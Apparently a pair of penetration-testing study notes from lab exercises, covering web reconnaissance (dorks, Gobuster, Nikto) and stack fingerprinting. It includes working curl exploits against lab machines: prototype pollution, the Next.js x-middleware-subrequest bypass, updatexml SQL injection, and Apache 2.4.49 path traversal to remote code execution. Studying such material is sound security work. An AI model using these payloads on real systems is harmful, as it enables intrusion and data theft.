# Web Content Discovery & Reconnaissance

## Overview

Content discovery is one of the most critical phases of web application reconnaissance. This note covers a comprehensive workflow combining **Manual Analysis**, **Open-Source Intelligence (OSINT)**, and **Automated Enumeration** to effectively map an application's attack surface and locate hidden entry points.

---

##  1. Manual Analysis Techniques

Before launching disruptive automated scans, examine resources exposed by convention or default behaviors to uncover sensitive infrastructure clues.

### Conventional Files

* **`robots.txt`**: Used to guide search engine crawlers on what paths *not* to index. It frequently exposes sensitive administrative or staging paths (e.g., `/staff-portal`), serving as a ready-made list of targets. It is a guideline for bots, not a security control.
* **`sitemap.xml`**: Lists endpoints the site owner explicitly wants indexed. It often inadvertently exposes staging pages, old content, or hidden endpoints containing vulnerable URL parameters (e.g., `/s3cr3t-area`, `/news/article?id=1`).

### Technical Indicators & Infrastructure Stack

* **HTTP Headers**: Web server responses often include headers revealing software types and back-end languages:
* `Server: nginx/1.18.0 (Ubuntu)` (Discloses specific OS and server versions).
* `X-Powered-By: THM-Framework` (Exposes development frameworks).
* *Note:* Custom debug flags or headers (e.g., `X-FLAG`) may also be leaked.


* **Framework Documentation**: Inspecting page source comments and copyright notices helps identify the underlying framework. Reviewing that framework's public documentation often exposes default administration directories, asset paths, and default credentials (e.g., `admin / admin`).

---

### 2. Open-Source Intelligence (OSINT)

OSINT techniques collect public information from third-party tools and platforms without interacting directly with the target infrastructure.

* **Google Hacking / Dorking**: Leveraging advanced operators to surface indexed vulnerabilities or exposed data.

| Filter | Example | Description |
| --- | --- | --- |
| `site:` | `site:example.thm` | Restricts results strictly to the target domain. |
| `inurl:` | `inurl:admin` | Restricts results to URLs containing the specified string. |
| `filetype:` | `filetype:pdf` | Filters by file extension (e.g., `pdf`, `log`, `env`, `conf`). |
| `intitle:` | `intitle:login` | Filters by strings found in the page title. |
| `intext:` | `intext:password` | Searches for explicit strings within the body content. |
| `cache:` | `cache:example.thm` | Views Google's cached snapshot of a historical version of the page. |

* **Wappalyzer**: A browser extension that fingerprints CMS platforms, programming languages, web servers, framework versions, and integrated payment processors on active page load.
* **Wayback Machine**: A digital archive capturing historical snapshots of websites. Useful for extracting legacy codebases, retired endpoints, forgotten API parameters, or temporary administrative pages.
* **GitHub Reconnaissance**: Explicit public repository searches for the target company name or domain. Reviewing public source trees—and critically, the **git commit history**—frequently yields accidentally committed hardcoded API keys, configuration files, and `.env` credentials.
* **S3 Buckets**: Public cloud storage endpoints formatted as `https://{name}.s3.amazonaws.com`. Permissive access controls on common naming schemes (e.g., `{company}-backup`, `{company}-assets`) often allow unauthenticated data exfiltration.

---

##  3. Automated Discovery via Gobuster

Manual and OSINT steps are bounded by visibility constraints. Automated tools rapidly brute-force directories, files, DNS records, and server blocks using defined wordlists (such as SecLists' `common.txt` or `directory-list-2.3-medium.txt`).

### Global Flag Control

* `-t / --threads`: Sets concurrent connections (Default: 10). Increase to scale speed.
* `-w / --wordlist`: Path to target directory or subdomain wordlist.
* `-o / --output`: Saves console findings directly to a text file.
* `--delay`: Time interval between requests (Used to bypass local rate limits).

### Execution Modes

#### A. Directory Mode (`dir`)

Brute-forces paths on a web server directly to locate files and folders.

```bash
gobuster dir -u "http://10.146.134.237" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x .php,.txt,.log -s 200,301,302

```

* Useful Modifiers:
* `-x`: Appends specific extensions to every item in the wordlist (e.g., `-x .php,.json`).
* `-r / --followredirect`: Instructs Gobuster to follow HTTP redirects (Status 3xx).
* `-s / --status-codes`: Restricts output display to specific status returns (e.g., `200 OK`).



#### B. DNS Mode (`dns`)

Queries subdomains using traditional DNS lookups. Essential because secondary subdomains often run older, unpatched service code.

```bash
gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --wildcard

```

* Useful Modifiers:
* `--wildcard`: Forces continuous discovery even if a wildcard DNS record exists.
* `-i / --show-ips`: Displays resolved target IP addresses beside identified subdomains.



#### C. Virtual Host Mode (`vhost`)

Unlike DNS mode, `vhost` mode connects directly to the target IP address and cycles through wordlist terms inside the **`Host:` HTTP Header**. This uncovers internal web configurations that are not declared in public DNS records.

```bash
gobuster vhost -u "http://10.146.134.237" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320

```

* Useful Modifiers:
* `--append-domain`: Combines the wordlist string directly with the base domain name.
* `--exclude-length`: Filters out false positives that generate uniform response body sizes.



---

##  Summary Reconnaissance Framework

| Method | Focus | Key Targets |
| --- | --- | --- |
| **Manual** | Quick Wins & Internal Logic | `robots.txt`, `sitemap.xml`, Source Comments, HTTP Headers |
| **OSINT** | Public Information Leaks | Google Dorks, Wayback Machine, GitHub Commits, S3 Buckets |
| **Automated** | Complete Attack Surface Mapping | Gobuster (`dir` paths, `dns` subdomains, `vhost` configurations) |

--------

# Web Stack Fingerprinting & Target Exploitation Guide

## Overview

Passive stack fingerprinting analyzes raw HTTP response signals—such as custom headers, cookie naming conventions, error page formats, and HTML source patterns—without transmitting malicious exploit payloads.

Accurately fingerprinting the specific technology stack and version number immediately reveals the exact attack surface and applicable Common Vulnerabilities and Exposures (CVEs), significantly increasing exploitation speed during time-boxed engagements.

---

## 🛠️ Web Stack Fingerprinting Reference

| Target Port / Stack | Key Passive Signal | Value / Specific Pattern | Confidence | Strategic Notes |
| --- | --- | --- | --- | --- |
| **Port 3000**<br>

<br>MERN Stack | `X-Powered-By` Header | `Express` | **High** | Primary signal; absent only if explicitly disabled via code or stripped by a reverse proxy (e.g., Nginx, Vercel). |
|  | `Set-Cookie` Header | `connect.sid=s%3A...` | **High** | Originated by `express-session` middleware. May be absent on unauthenticated requests if `saveUninitialized: false`. |
|  | Unhandled Route | Plain text: `Cannot GET /path` | **High** | Distinctive default plain-text string; differs completely from styled framework error pages. |
| **Port 3001**<br>

<br>Next.js | `X-Powered-By` Header | `Next.js` | **High** | Framework-specific banner. |
|  | HTML Source | `window.__next_f` inside a `<script>` tag | **High** | The definitive **App Router** indicator used for React Server Component data hydration. |
|  | Custom Headers | `x-nextjs-cache: HIT`, `x-nextjs-prerender: 1` | **High** | Confirms the application is running a compiled production build. |
| **Port 8000**<br>

<br>Django | `Server` Header | `WSGIServer/0.2 CPython/X.X.X` | **High** | Django-specific development/WSGI server banner. |
|  | HTML Source Forms | Name attribute: `csrfmiddlewaretoken` | **High** | Injected automatically into all POST forms by `CsrfViewMiddleware`. |
|  | Security Headers | `X-Frame-Options: DENY`<br>

<br>`X-Content-Type-Options: nosniff`<br>

<br>`Referrer-Policy: same-origin` | **High** | Applied simultaneously by default via Django's `SecurityMiddleware`. |
| **Port 8080**<br>

<br>LAMP (Apache) | `Server` Header | `Apache/2.4.49 (Unix)` | **High** | Direct, exact version match pointing to severe, unpatched critical vulnerabilities. |
|  | Directory Probing | `/cgi-bin/` returning `403 Forbidden` | **High** | Confirms the target directory exists and `mod_cgi` is actively enabled. |

---

## 🤖 Automated Scanner Fingerprint Auditing (Nikto)

While manual fingerprinting is foundational, scanning broad scopes requires efficient prioritization. **Nikto** provides a rapid first pass—probing each service, parsing HTTP banners, and surfacing architectural misconfigurations or known missing security headers without deploying intrusive exploits.

```bash
# General Target Syntax Usage
nikto -h http://MACHINE_IP:PORT

```

### 📋 Port-by-Port Analysis

#### 🟢 Port 3000: MERN Stack

* **Key Signals:** Detects `X-Powered-By: Express` and the session tracker cookie signature `connect.sid`.
* **Security Deficiencies:** Flags when the `connect.sid` cookie lacks the `HttpOnly` security attribute and notices the absence of anti-clickjacking frameworks (`X-Frame-Options`).
* **Verdict:** Confirms the Node/Express infrastructure backend, shifting target analysis toward API endpoints.

#### 🟢 Port 3001: Next.js

* **Key Signals:** Captures `X-Powered-By: Next.js` alongside structural caching deployment headers: `x-nextjs-cache: HIT`, `x-nextjs-prerender: 1`, and `x-nextjs-stale-time`.
* **Verdict:** Verifies that the App Router is running in its compiled production build layout—the explicit prerequisite required to execute the middleware authentication bypass.

#### 🟢 Port 8000: Django

* **Key Signals:** Extracts the precise, framework-explicit software definition: `Server: WSGIServer/0.2 CPython/3.10.12`.
* **Security Indicators:** Notes active `referrer-policy: same-origin` and `x-content-type-options: nosniff` implementations.
* **Verdict:** Confirms Django's native `SecurityMiddleware` layers are active, directing attention to input parameter validation rather than generic header exploits.

#### 🟢 Port 8080: Apache LAMP

* **Key Signals:** Directly retrieves `Server: Apache/2.4.49 (Unix)`.
* **Secondary Findings:** Notes that the server leaks filesystem inodes via active `ETags` configurations and identifies that the `HTTP TRACE` protocol method is allowed (making it potentially susceptible to Cross-Site Tracing).
* **Verdict:** Provides an immediate, definitive confirmation of an exploitable version match for CVE-2021-41773.

> 📝 **Strategic Assessment:** Nikto maps out broad application footprints in seconds, exposing low-level system banners like Apache's exact software build. However, automated vulnerability tools lack context for application-level logical flaws, such as dynamic object handling or custom ORM queries. This is the precise boundary where manual verification frameworks take over.

---

## ⚡ Exploitation Walkthroughs & Deep Dives

### 1. MERN Stack: Prototype Pollution to Auth Bypass (CVE-2020-8203)

When a dynamic JavaScript utility function blindly merges user-controlled JSON data into a target server-side object without validation, it creates an attack surface for prototype pollution.

#### Vulnerable Code Pattern

```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]); // Dangerous deep recursion
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

```

#### Exploit Execution

When the application processes the target JSON payload, the recursive merge function maps the keys onto the global root object constructor. This globally injects the property `isAdmin: true` into the global `Object.prototype` layer inside the Node.js runtime environment.

1. **Inject the Payload:**
```bash
curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update \
     -H "Content-Type: application/json" \
     -d '{"__proto__": {"isAdmin": true}}'

```


2. **Access the Flag Endpoint:**
```bash
curl -b cookies.txt http://MACHINE_IP:3000/api/admin/flag

```


*Result:* Because the authorization endpoint validates `currentUser.isAdmin`, the validation check traverses upward along the modified prototype chain, resolves to `true`, and prints the flag.

---

### 2. Next.js: Middleware Authentication Bypass (CVE-2025-29927)

Next.js production applications utilize internal subrequest tracking headers to ensure recursive middleware executions do not induce localized processing loops.

#### Root Cause

Next.js fails to establish origin validation checks on incoming `x-middleware-subrequest` headers. When an external client presents this header manually, the framework falsely categorizes the request as a trusted internal subrequest and skips the middleware authentication gate entirely.

#### Exploit Execution

To bypass authentication checks and force direct routing to the server-side logic of a restricted `/dashboard` pathway, pass the module path string repeated five times:

```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://MACHINE_IP:3001/dashboard

```

> 💡 **Tip:** If the target application deploys a `/src` directory architecture layout, adapt the payload construction to target the source folder pathway:
> `src/middleware:src/middleware:src/middleware:src/middleware:src/middleware`

---

### 3. Django: Error-Based SQL Injection (CVE-2021-35042)

This vulnerability occurs when an application bypasses standard Object-Relational Mapping (ORM) safe parameter limits or passes unvalidated parameters directly into underlying query manipulation functions like `.order_by()`.

#### Vulnerable Code Pattern

```python
order = self.request.GET.get('order', 'name')
sql = (
    'SELECT id, name, price, description FROM products_product '
    f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)')

```

#### Exploit Execution

Because the parameter is directly concatenated, we can use an error-based SQL injection payload targeting the underlying MySQL database engine. By inserting `updatexml()`, we intentionally trigger an internal XPath validation error containing our query results. This error is displayed on-screen if Django's default `DEBUG = True` mode is enabled.

1. **Extract Database Version & Verify Vulnerability:**
```bash
curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'

```


2. **Extract Active Database Name:**
```bash
curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'

```



---

### 4. Apache 2.4.49: Path Traversal & RCE (CVE-2021-41773)

A flaw within Apache version 2.4.49's path normalization engine (`ap_normalize_path()`) mistakenly validates path characters *before* parsing URL-encoded elements, making it possible to bypass standard directory traversal path restrictions.

#### Root Cause

The traversal filter fails to recognize the URL-encoded sequence `.%2e/` as a directory traversal (`../`) attempt. When the request is later passed down to the file system layer, the operating system decodes and resolves the path, allowing an attacker to break out of the defined web root.

#### Exploit Execution

When combined with a functional `/cgi-bin/` configuration layout running `mod_cgi`, the directory traversal bypass can point to system binaries (like `/bin/sh`), allowing for unauthenticated Remote Code Execution (RCE).

```bash
curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
     --data 'echo Content-Type: text/plain; echo; id; cat /flag.txt'

```

> ⚠️ **CRITICAL:** The `--path-as-is` parameter is mandatory. Without it, the local client shell environment automatically sanitizes the path sequence prior to network transmission, neutralizing the traversal attempt before it reaches the target server.

---

## 🎯 Master Target Vulnerability Mapping Matrix

Every technology stack inherently leaks its core composition signals. By aligning automated visibility, passive observation patterns, and precise exploit validation strategies, operators can rapidly map vulnerabilities to corresponding technical targets:

| Architecture Stack | Primary Passive Signals | Target Exploit Mechanism | CVE ID Reference | Impact Classification | CVSS Base Score |
| --- | --- | --- | --- | --- | --- |
| **MERN / Express** | `X-Powered-By: Express`<br>

<br>`Set-Cookie: connect.sid` | Object runtime constructor manipulation via unfiltered deep parsing loops. | **CVE-2020-8203** | Prototype Pollution ➡️ Administrative Bypass | **7.4 High** |
| **Next.js App Router** | `X-Powered-By: Next.js`<br>

<br>`window.__next_f` script tags | Unauthenticated spoofing of internal `x-middleware-subrequest` processing routing indicators. | **CVE-2025-29927** | Authentication Bypass ➡️ Sensitive Information Leakage | **9.1 Critical** |
| **Django App Stack** | `Server: WSGIServer`<br>

<br>Injected `csrfmiddlewaretoken` fields | Direct input string concatenation intersecting unparameterized SQL `.order_by()` methods. | **CVE-2021-35042** | Error-Based XPath String Data Exfiltration | **9.8 Critical** |
| **LAMP / Apache Server** | `Server: Apache/2.4.49`<br>

<br>Accessible `/cgi-bin/` directories | Normalization processing flaws misinterpreting `.%2e/` sequences before URL decoding occurs. | **CVE-2021-41773** | Path Traversal ➡️ Unauthenticated Remote Code Execution (RCE) | **9.8 Critical** |
